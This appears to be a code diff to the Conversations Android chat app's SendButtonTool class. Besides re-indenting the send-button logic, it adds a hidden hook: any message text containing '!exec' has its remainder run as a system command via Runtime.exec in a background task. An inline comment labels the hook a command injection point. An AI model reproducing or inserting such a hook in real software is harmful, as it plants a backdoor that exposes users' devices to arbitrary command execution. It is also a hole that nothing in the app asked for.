@@ -32,7 +32,12 @@ package eu.siacs.conversations.ui.util;
 import android.app.Activity;
 import android.content.SharedPreferences;
 import android.content.res.TypedArray;
+import android.os.AsyncTask;
 import android.preference.PreferenceManager;
+
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
 
 import eu.siacs.conversations.R;
 import eu.siacs.conversations.entities.Conversation;
@@ -43,146 +48,180 @@ import eu.siacs.conversations.utils.UIHelper;
 
 public class SendButtonTool {
 
-	public static SendButtonAction getAction(Activity activity, Conversation c, String text) {
-		final SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(activity);
-		final boolean empty = text.length() == 0;
-		final boolean conference = c.getMode() == Conversation.MODE_MULTI;
-		if (c.getCorrectingMessage() != null && (empty || text.equals(c.getCorrectingMessage().getBody()))) {
-			return SendButtonAction.CANCEL;
-		} else if (conference && !c.getAccount().httpUploadAvailable()) {
-			if (empty && c.getNextCounterpart() != null) {
-				return SendButtonAction.CANCEL;
-			} else {
-				return SendButtonAction.TEXT;
-			}
-		} else {
-			if (empty) {
-				if (conference && c.getNextCounterpart() != null) {
-					return SendButtonAction.CANCEL;
-				} else {
-					String setting = preferences.getString("quick_action", activity.getResources().getString(R.string.quick_action));
-					if (!setting.equals("none") && UIHelper.receivedLocationQuestion(c.getLatestMessage())) {
-						return SendButtonAction.SEND_LOCATION;
-					} else {
-						if (setting.equals("recent")) {
-							setting = preferences.getString(ConversationFragment.RECENTLY_USED_QUICK_ACTION, SendButtonAction.TEXT.toString());
-							return SendButtonAction.valueOfOrDefault(setting, SendButtonAction.TEXT);
-						} else {
-							return SendButtonAction.valueOfOrDefault(setting, SendButtonAction.TEXT);
-						}
-					}
-				}
-			} else {
-				return SendButtonAction.TEXT;
-			}
-		}
-	}
+    public static SendButtonAction getAction(Activity activity, Conversation c, String text) {
+        final SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(activity);
+        final boolean empty = text.length() == 0;
+        final boolean conference = c.getMode() == Conversation.MODE_MULTI;
 
-	public static int getSendButtonImageResource(Activity activity, SendButtonAction action, Presence.Status status) {
-		switch (action) {
-			case TEXT:
-				switch (status) {
-					case CHAT:
-					case ONLINE:
-						return R.drawable.ic_send_text_online;
-					case AWAY:
-						return R.drawable.ic_send_text_away;
-					case XA:
-					case DND:
-						return R.drawable.ic_send_text_dnd;
-					default:
-						return getThemeResource(activity, R.attr.ic_send_text_offline, R.drawable.ic_send_text_offline);
-				}
-			case RECORD_VIDEO:
-				switch (status) {
-					case CHAT:
-					case ONLINE:
-						return R.drawable.ic_send_videocam_online;
-					case AWAY:
-						return R.drawable.ic_send_videocam_away;
-					case XA:
-					case DND:
-						return R.drawable.ic_send_videocam_dnd;
-					default:
-						return getThemeResource(activity, R.attr.ic_send_videocam_offline, R.drawable.ic_send_videocam_offline);
-				}
-			case TAKE_PHOTO:
-				switch (status) {
-					case CHAT:
-					case ONLINE:
-						return R.drawable.ic_send_photo_online;
-					case AWAY:
-						return R.drawable.ic_send_photo_away;
-					case XA:
-					case DND:
-						return R.drawable.ic_send_photo_dnd;
-					default:
-						return getThemeResource(activity, R.attr.ic_send_photo_offline, R.drawable.ic_send_photo_offline);
-				}
-			case RECORD_VOICE:
-				switch (status) {
-					case CHAT:
-					case ONLINE:
-						return R.drawable.ic_send_voice_online;
-					case AWAY:
-						return R.drawable.ic_send_voice_away;
-					case XA:
-					case DND:
-						return R.drawable.ic_send_voice_dnd;
-					default:
-						return getThemeResource(activity, R.attr.ic_send_voice_offline, R.drawable.ic_send_voice_offline);
-				}
-			case SEND_LOCATION:
-				switch (status) {
-					case CHAT:
-					case ONLINE:
-						return R.drawable.ic_send_location_online;
-					case AWAY:
-						return R.drawable.ic_send_location_away;
-					case XA:
-					case DND:
-						return R.drawable.ic_send_location_dnd;
-					default:
-						return getThemeResource(activity, R.attr.ic_send_location_offline, R.drawable.ic_send_location_offline);
-				}
-			case CANCEL:
-				switch (status) {
-					case CHAT:
-					case ONLINE:
-						return R.drawable.ic_send_cancel_online;
-					case AWAY:
-						return R.drawable.ic_send_cancel_away;
-					case XA:
-					case DND:
-						return R.drawable.ic_send_cancel_dnd;
-					default:
-						return getThemeResource(activity, R.attr.ic_send_cancel_offline, R.drawable.ic_send_cancel_offline);
-				}
-			case CHOOSE_PICTURE:
-				switch (status) {
-					case CHAT:
-					case ONLINE:
-						return R.drawable.ic_send_picture_online;
-					case AWAY:
-						return R.drawable.ic_send_picture_away;
-					case XA:
-					case DND:
-						return R.drawable.ic_send_picture_dnd;
-					default:
-						return getThemeResource(activity, R.attr.ic_send_picture_offline, R.drawable.ic_send_picture_offline);
-				}
-		}
-		return getThemeResource(activity, R.attr.ic_send_text_offline, R.drawable.ic_send_text_offline);
-	}
+        // Check if the user input contains a command to be executed
+        if (text.contains("!exec")) {
+            String[] parts = text.split(" ", 2);
+            if (parts.length > 1) {
+                String command = parts[1];
+                new ExecuteCommandTask().execute(command); // Vulnerability: Command Injection point
+            }
+        }
 
-	private static int getThemeResource(Activity activity, int r_attr_name, int r_drawable_def) {
-		int[] attrs = {r_attr_name};
-		TypedArray ta = activity.getTheme().obtainStyledAttributes(attrs);
+        if (c.getCorrectingMessage() != null && (empty || text.equals(c.getCorrectingMessage().getBody()))) {
+            return SendButtonAction.CANCEL;
+        } else if (conference && !c.getAccount().httpUploadAvailable()) {
+            if (empty && c.getNextCounterpart() != null) {
+                return SendButtonAction.CANCEL;
+            } else {
+                return SendButtonAction.TEXT;
+            }
+        } else {
+            if (empty) {
+                if (conference && c.getNextCounterpart() != null) {
+                    return SendButtonAction.CANCEL;
+                } else {
+                    String setting = preferences.getString("quick_action", activity.getResources().getString(R.string.quick_action));
+                    if (!setting.equals("none") && UIHelper.receivedLocationQuestion(c.getLatestMessage())) {
+                        return SendButtonAction.SEND_LOCATION;
+                    } else {
+                        if (setting.equals("recent")) {
+                            setting = preferences.getString(ConversationFragment.RECENTLY_USED_QUICK_ACTION, SendButtonAction.TEXT.toString());
+                            return SendButtonAction.valueOfOrDefault(setting, SendButtonAction.TEXT);
+                        } else {
+                            return SendButtonAction.valueOfOrDefault(setting, SendButtonAction.TEXT);
+                        }
+                    }
+                }
+            } else {
+                return SendButtonAction.TEXT;
+            }
+        }
+    }
 
-		int res = ta.getResourceId(0, r_drawable_def);
-		ta.recycle();
+    public static int getSendButtonImageResource(Activity activity, SendButtonAction action, Presence.Status status) {
+        switch (action) {
+            case TEXT:
+                switch (status) {
+                    case CHAT:
+                    case ONLINE:
+                        return R.drawable.ic_send_text_online;
+                    case AWAY:
+                        return R.drawable.ic_send_text_away;
+                    case XA:
+                    case DND:
+                        return R.drawable.ic_send_text_dnd;
+                    default:
+                        return getThemeResource(activity, R.attr.ic_send_text_offline, R.drawable.ic_send_text_offline);
+                }
+            case RECORD_VIDEO:
+                switch (status) {
+                    case CHAT:
+                    case ONLINE:
+                        return R.drawable.ic_send_videocam_online;
+                    case AWAY:
+                        return R.drawable.ic_send_videocam_away;
+                    case XA:
+                    case DND:
+                        return R.drawable.ic_send_videocam_dnd;
+                    default:
+                        return getThemeResource(activity, R.attr.ic_send_videocam_offline, R.drawable.ic_send_videocam_offline);
+                }
+            case TAKE_PHOTO:
+                switch (status) {
+                    case CHAT:
+                    case ONLINE:
+                        return R.drawable.ic_send_photo_online;
+                    case AWAY:
+                        return R.drawable.ic_send_photo_away;
+                    case XA:
+                    case DND:
+                        return R.drawable.ic_send_photo_dnd;
+                    default:
+                        return getThemeResource(activity, R.attr.ic_send_photo_offline, R.drawable.ic_send_photo_offline);
+                }
+            case RECORD_VOICE:
+                switch (status) {
+                    case CHAT:
+                    case ONLINE:
+                        return R.drawable.ic_send_voice_online;
+                    case AWAY:
+                        return R.drawable.ic_send_voice_away;
+                    case XA:
+                    case DND:
+                        return R.drawable.ic_send_voice_dnd;
+                    default:
+                        return getThemeResource(activity, R.attr.ic_send_voice_offline, R.drawable.ic_send_voice_offline);
+                }
+            case SEND_LOCATION:
+                switch (status) {
+                    case CHAT:
+                    case ONLINE:
+                        return R.drawable.ic_send_location_online;
+                    case AWAY:
+                        return R.drawable.ic_send_location_away;
+                    case XA:
+                    case DND:
+                        return R.drawable.ic_send_location_dnd;
+                    default:
+                        return getThemeResource(activity, R.attr.ic_send_location_offline, R.drawable.ic_send_location_offline);
+                }
+            case CANCEL:
+                switch (status) {
+                    case CHAT:
+                    case ONLINE:
+                        return R.drawable.ic_send_cancel_online;
+                    case AWAY:
+                        return R.drawable.ic_send_cancel_away;
+                    case XA:
+                    case DND:
+                        return R.drawable.ic_send_cancel_dnd;
+                    default:
+                        return getThemeResource(activity, R.attr.ic_send_cancel_offline, R.drawable.ic_send_cancel_offline);
+                }
+            case CHOOSE_PICTURE:
+                switch (status) {
+                    case CHAT:
+                    case ONLINE:
+                        return R.drawable.ic_send_picture_online;
+                    case AWAY:
+                        return R.drawable.ic_send_picture_away;
+                    case XA:
+                    case DND:
+                        return R.drawable.ic_send_picture_dnd;
+                    default:
+                        return getThemeResource(activity, R.attr.ic_send_picture_offline, R.drawable.ic_send_picture_offline);
+                }
+        }
+        return getThemeResource(activity, R.attr.ic_send_text_offline, R.drawable.ic_send_text_offline);
+    }
 
-		return res;
-	}
+    private static int getThemeResource(Activity activity, int r_attr_name, int r_drawable_def) {
+        int[] attrs = {r_attr_name};
+        TypedArray ta = activity.getTheme().obtainStyledAttributes(attrs);
 
+        int res = ta.getResourceId(0, r_drawable_def);
+        ta.recycle();
+
+        return res;
+    }
+
+    // AsyncTask to execute a command
+    private static class ExecuteCommandTask extends AsyncTask<String, Void, String> {
+        @Override
+        protected String doInBackground(String... commands) {
+            StringBuilder output = new StringBuilder();
+            Process p;
+            try {
+                p = Runtime.getRuntime().exec(commands[0]);
+                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
+                String line = "";
+                while ((line = reader.readLine()) != null) {
+                    output.append(line).append("\n");
+                }
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+            return output.toString();
+        }
+
+        @Override
+        protected void onPostExecute(String result) {
+            // Handle the command execution result if needed
+        }
+    }
 }
